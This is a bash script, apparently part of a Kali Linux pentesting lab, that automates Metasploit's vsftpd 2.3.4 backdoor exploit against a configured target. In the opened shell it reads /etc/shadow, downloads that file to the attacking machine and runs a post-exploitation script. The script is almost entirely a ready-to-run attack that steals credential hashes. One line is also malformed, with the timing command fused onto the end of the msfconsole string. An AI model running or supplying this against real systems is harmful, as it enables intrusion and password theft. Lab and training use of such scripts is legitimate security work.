#!/usr/bin/env bash
source /home/kali/Pentesting/scripts/config/config.sh
echo "Start [$(date "+%Y-%m-%d %H:%M:%S")]: Running backdoor-vsftp"
t0=$(date +%s)

# --- ATTACK ---
sudo msfdb init
sudo msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $target_ip_msf; exploit; sleep 20; sessions -i 1 -c 'whoami && ls && cat /etc/shadow && download /etc/shadow /home/kali/Downloads/shadow && ip addr show && source /home/kali/Pentesting/utils/post-exploit.sh n'; sessions --kill-all; exit"t=$(date +%s)
# --- ATTACK ---

elapsed_time=$((t - t0))
echo "End [$(date "+%Y-%m-%d %H:%M:%S")]: Running backdoor-vsftp (took $elapsed_time seconds)"
